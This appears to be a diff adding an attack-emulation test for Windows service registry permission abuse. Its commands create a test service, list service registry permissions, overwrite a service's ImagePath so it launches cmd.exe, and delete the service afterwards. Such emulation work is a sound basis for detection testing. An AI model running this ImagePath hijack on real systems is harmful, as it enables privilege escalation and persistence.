@@ -1,0 +1,13 @@
+
+sc.exe create weakservicename binpath= "%windir%\system32\win32calc.exe"
+
+
+get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\* |FL
+get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\weakservicename |FL
+
+
+
+reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\calcservice" /f /v ImagePath /d "%windir%\system32\cmd.exe"
+
+Cleanup Commands:
+sc.exe delete calcservice
